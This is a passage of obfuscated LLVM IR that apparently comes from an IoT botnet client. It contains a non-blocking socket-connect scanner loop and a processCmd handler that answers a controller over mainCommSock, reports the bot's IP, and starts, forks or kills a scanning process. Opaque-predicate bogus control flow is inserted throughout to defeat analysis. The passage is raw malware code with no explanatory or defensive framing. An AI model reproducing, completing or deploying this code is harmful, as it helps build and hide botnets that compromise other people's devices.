  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %118, i32 0, i32 0
  store i32 %115, i32* %119, align 8
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = load i32, i32* %8, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %126
  %128 = getelementptr inbounds %struct.state_t, %struct.state_t* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 8
  %130 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 3, i8* null)
  %131 = or i32 %130, 2048
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 4, i32 %131)
  %133 = load i32, i32* %8, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %134
  %136 = getelementptr inbounds %struct.state_t, %struct.state_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %139 = call i32 @connect(i32 %137, %struct.sockaddr* %138, i32 16)
  %140 = icmp ne i32 %139, -1
  br i1 %140, label %161, label %141

; <label>:141:                                    ; preds = %114
  %142 = load i32, i32* @x.71
  %143 = load i32, i32* @y.72
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %141
  %150 = call i32* @__errno_location() #13
  %151 = load i32, i32* %150, align 4
  %152 = icmp ne i32 %151, 115
  %153 = load i32, i32* @x.71
  %154 = load i32, i32* @y.72
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %152, label %161, label %168

; <label>:161:                                    ; preds = %originalBBpart230, %114
  %162 = load i32, i32* %8, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %163
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 8
  %167 = call i32 @close(i32 %166)
  br label %173

; <label>:168:                                    ; preds = %originalBBpart230
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 1
  store i8 1, i8* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %168, %161
  br label %393

; <label>:174:                                    ; preds = %originalBBpart226
  %175 = load i32, i32* @x.71
  %176 = load i32, i32* @y.72
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %174
  %183 = load i32, i32* @x.71
  %184 = load i32, i32* @y.72
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %191

; <label>:191:                                    ; preds = %originalBBpart234
  %192 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %193 = getelementptr inbounds [16 x i64], [16 x i64]* %192, i64 0, i64 0
  %194 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %193) #2, !srcloc !7
  %195 = extractvalue { i64, i64* } %194, 0
  %196 = extractvalue { i64, i64* } %194, 1
  %197 = trunc i64 %195 to i32
  store i32 %197, i32* %18, align 4
  %198 = ptrtoint i64* %196 to i64
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %19, align 4
  br label %200

; <label>:200:                                    ; preds = %191
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = srem i32 %206, 64
  %208 = zext i32 %207 to i64
  %209 = shl i64 1, %208
  %210 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = sdiv i32 %215, 64
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %217
  %219 = load i64, i64* %218, align 8
  %220 = or i64 %219, %209
  store i64 %220, i64* %218, align 8
  %221 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %221, align 8
  %222 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %222, align 8
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = add nsw i32 %227, 1
  %229 = call i32 @select(i32 %228, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %229, i32* %15, align 4
  %230 = load i32, i32* %15, align 4
  %231 = icmp eq i32 %230, 1
  br i1 %231, label %232, label %291

; <label>:232:                                    ; preds = %201
  store i32 4, i32* %13, align 4
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = bitcast i32* %14 to i8*
  %239 = call i32 @getsockopt(i32 %237, i32 1, i32 4, i8* %238, i32* %13) #2
  %240 = load i32, i32* %14, align 4
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %269

; <label>:242:                                    ; preds = %232
  %243 = load i32, i32* @x.71
  %244 = load i32, i32* @y.72
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %242
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  %261 = load i32, i32* @x.71
  %262 = load i32, i32* @y.72
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %274

; <label>:269:                                    ; preds = %232
  %270 = load i32, i32* %8, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %271
  %273 = getelementptr inbounds %struct.state_t, %struct.state_t* %272, i32 0, i32 1
  store i8 2, i8* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %269, %originalBBpart238
  %275 = load i32, i32* @x.71
  %276 = load i32, i32* @y.72
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %274
  %283 = load i32, i32* @x.71
  %284 = load i32, i32* @y.72
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %306

; <label>:291:                                    ; preds = %201
  %292 = load i32, i32* %15, align 4
  %293 = icmp eq i32 %292, -1
  br i1 %293, label %294, label %305

; <label>:294:                                    ; preds = %291
  %295 = load i32, i32* %8, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %296
  %298 = getelementptr inbounds %struct.state_t, %struct.state_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 8
  %300 = call i32 @close(i32 %299)
  %301 = load i32, i32* %8, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %302
  %304 = getelementptr inbounds %struct.state_t, %struct.state_t* %303, i32 0, i32 1
  store i8 0, i8* %304, align 4
  br label %305

; <label>:305:                                    ; preds = %294, %291
  br label %306

; <label>:306:                                    ; preds = %305, %originalBBpart242
  %307 = load i32, i32* @x.71
  %308 = load i32, i32* @y.72
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %306
  %315 = load i32, i32* @x.71
  %316 = load i32, i32* @y.72
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %393

; <label>:323:                                    ; preds = %originalBBpart226
  br label %324

; <label>:324:                                    ; preds = %323
  %325 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %326 = getelementptr inbounds [16 x i64], [16 x i64]* %325, i64 0, i64 0
  %327 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %326) #2, !srcloc !8
  %328 = extractvalue { i64, i64* } %327, 0
  %329 = extractvalue { i64, i64* } %327, 1
  %330 = trunc i64 %328 to i32
  store i32 %330, i32* %20, align 4
  %331 = ptrtoint i64* %329 to i64
  %332 = trunc i64 %331 to i32
  store i32 %332, i32* %21, align 4
  br label %333

; <label>:333:                                    ; preds = %324
  %334 = load i32, i32* @x.71
  %335 = load i32, i32* @y.72
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %333
  %342 = load i32, i32* @x.71
  %343 = load i32, i32* @y.72
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %350

; <label>:350:                                    ; preds = %originalBBpart250
  %351 = load i32, i32* %8, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %352
  %354 = getelementptr inbounds %struct.state_t, %struct.state_t* %353, i32 0, i32 0
  %355 = load i32, i32* %354, align 8
  %356 = srem i32 %355, 64
  %357 = zext i32 %356 to i64
  %358 = shl i64 1, %357
  %359 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %360 = load i32, i32* %8, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %361
  %363 = getelementptr inbounds %struct.state_t, %struct.state_t* %362, i32 0, i32 0
  %364 = load i32, i32* %363, align 8
  %365 = sdiv i32 %364, 64
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [16 x i64], [16 x i64]* %359, i64 0, i64 %366
  %368 = load i64, i64* %367, align 8
  %369 = or i64 %368, %358
  store i64 %369, i64* %367, align 8
  %370 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %370, align 8
  %371 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %371, align 8
  %372 = load i32, i32* %8, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %373
  %375 = getelementptr inbounds %struct.state_t, %struct.state_t* %374, i32 0, i32 0
  %376 = load i32, i32* %375, align 8
  %377 = add nsw i32 %376, 1
  %378 = call i32 @select(i32 %377, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %378, i32* %15, align 4
  %379 = load i32, i32* %15, align 4
  %380 = icmp ne i32 %379, 0
  br i1 %380, label %381, label %392

; <label>:381:                                    ; preds = %350
  %382 = load i32, i32* %8, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %383
  %385 = getelementptr inbounds %struct.state_t, %struct.state_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 8
  %387 = call i32 @close(i32 %386)
  %388 = load i32, i32* %8, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %389
  %391 = getelementptr inbounds %struct.state_t, %struct.state_t* %390, i32 0, i32 1
  store i8 0, i8* %391, align 4
  br label %392

; <label>:392:                                    ; preds = %381, %350
  br label %393

; <label>:393:                                    ; preds = %392, %originalBBpart246, %173, %originalBBpart226
  br label %394

; <label>:394:                                    ; preds = %393
  %395 = load i32, i32* %8, align 4
  %396 = add nsw i32 %395, 1
  store i32 %396, i32* %8, align 4
  br label %87

; <label>:397:                                    ; preds = %87
  br label %82

; <label>:398:                                    ; preds = %82
  %399 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %399)
  br label %400

; <label>:400:                                    ; preds = %398, %originalBBpart2
  %401 = load i32, i32* @x.71
  %402 = load i32, i32* @y.72
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %400
  %409 = load i32, i32* @x.71
  %410 = load i32, i32* @y.72
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %33
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %417 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %418 = getelementptr inbounds [8 x i8], [8 x i8]* %417, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %418, i8 0, i64 8, i32 4, i1 false)
  %419 = load i32, i32* %7, align 4
  %420 = zext i32 %419 to i64
  %421 = call i8* @llvm.stacksave()
  store i8* %421, i8** %10, align 8
  %422 = alloca %struct.state_t, i64 %420, align 16
  %423 = bitcast %struct.state_t* %422 to i8*
  %424 = load i32, i32* %7, align 4
  %425 = sext i32 %424 to i64
  %_ = sub i64 %425, 5
  %gen = mul i64 %_, 5
  %_2 = shl i64 %425, 5
  %_3 = sub i64 0, %425
  %gen4 = add i64 %_3, 5
  %_5 = shl i64 %425, 5
  %426 = mul i64 %425, 5
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 %426, i32 16, i1 false)
  %427 = call noalias i8* @malloc(i64 1024) #2
  store i8* %427, i8** %16, align 8
  %428 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %428, i8 0, i64 1024, i32 1, i1 false)
  %429 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %430 = load i32, i32* %6, align 4
  %_6 = sub i32 %429, %430
  %gen7 = mul i32 %_6, %430
  %_8 = shl i32 %429, %430
  %_9 = shl i32 %429, %430
  %_10 = sub i32 %429, %430
  %gen11 = mul i32 %_10, %430
  %_12 = shl i32 %429, %430
  %_13 = sub i32 0, %429
  %gen14 = add i32 %_13, %430
  %_15 = sub i32 %429, %430
  %gen16 = mul i32 %_15, %430
  %_17 = sub i32 0, %429
  %gen18 = add i32 %_17, %430
  %_19 = sub i32 0, %429
  %gen20 = add i32 %_19, %430
  %431 = add nsw i32 %429, %430
  store i32 %431, i32* %17, align 4
  br label %originalBB1

originalBB24alteredBB:                            ; preds = %originalBB24, %91
  %432 = load i32, i32* %8, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %433
  %435 = getelementptr inbounds %struct.state_t, %struct.state_t* %434, i32 0, i32 1
  %436 = load i8, i8* %435, align 4
  %437 = zext i8 %436 to i32
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %141
  %438 = call i32* @__errno_location() #13
  %439 = load i32, i32* %438, align 4
  %440 = icmp ne i32 %439, 115
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %174
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %242
  %441 = load i32, i32* %8, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %442
  %444 = getelementptr inbounds %struct.state_t, %struct.state_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 8
  %446 = call i32 @close(i32 %445)
  %447 = load i32, i32* %8, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %448
  %450 = getelementptr inbounds %struct.state_t, %struct.state_t* %449, i32 0, i32 1
  store i8 0, i8* %450, align 4
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %274
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %306
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %333
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %400
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %56, label %37

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @x.73
  %39 = load i32, i32* @y.74
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i32 0, i32 0))
  %48 = load i32, i32* @x.73
  %49 = load i32, i32* @y.74
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1102

; <label>:56:                                     ; preds = %2
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %67, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %65 = call i8* @inet_ntoa(i32 %64) #2
  %66 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* %65)
  br label %1102

; <label>:67:                                     ; preds = %56
  %68 = load i32, i32* @x.73
  %69 = load i32, i32* @y.74
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i8**, i8*** %4, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strcmp(i8* %78, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0)) #10
  %80 = icmp ne i32 %79, 0
  %81 = load i32, i32* @x.73
  %82 = load i32, i32* @y.74
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %80, label %228, label %89

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* %3, align 4
  %91 = icmp ne i32 %90, 2
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i32 (i32, i8*, ...) @sockprintf(i32 %93, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.49, i32 0, i32 0))
  br label %1102

; <label>:95:                                     ; preds = %89
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strcmp(i8* %98, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %124, label %101

; <label>:101:                                    ; preds = %95
  %102 = load i32, i32* @x.73
  %103 = load i32, i32* @y.74
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = load i32, i32* @scanPid, align 4
  %111 = icmp eq i32 %110, 0
  %112 = load i32, i32* @x.73
  %113 = load i32, i32* @y.74
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %111, label %120, label %121

; <label>:120:                                    ; preds = %originalBBpart28
  br label %1102

; <label>:121:                                    ; preds = %originalBBpart28
  %122 = load i32, i32* @scanPid, align 4
  %123 = call i32 @kill(i32 %122, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %124

; <label>:124:                                    ; preds = %121, %95
  %125 = load i32, i32* @x.73
  %126 = load i32, i32* @y.74
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %124
  %133 = load i8**, i8*** %4, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @strcmp(i8* %135, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0)) #10
  %137 = icmp ne i32 %136, 0
  %138 = load i32, i32* @x.73
  %139 = load i32, i32* @y.74
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %137, label %227, label %146

; <label>:146:                                    ; preds = %originalBBpart212
  %147 = load i32, i32* @x.73
  %148 = load i32, i32* @y.74
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %146
  %155 = load i32, i32* @scanPid, align 4
  %156 = icmp ne i32 %155, 0
  %157 = load i32, i32* @x.73
  %158 = load i32, i32* @y.74
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %156, label %165, label %166

; <label>:165:                                    ; preds = %originalBBpart216
  br label %1102

; <label>:166:                                    ; preds = %originalBBpart216
  %167 = load i32, i32* @x.73
  %168 = load i32, i32* @y.74
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %166
  %175 = call i32 @fork() #2
  store i32 %175, i32* %6, align 4
  %176 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0))
  %177 = load i32, i32* %6, align 4
  %178 = icmp ugt i32 %177, 0
  %179 = load i32, i32* @x.73
  %180 = load i32, i32* @y.74
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %178, label %187, label %189

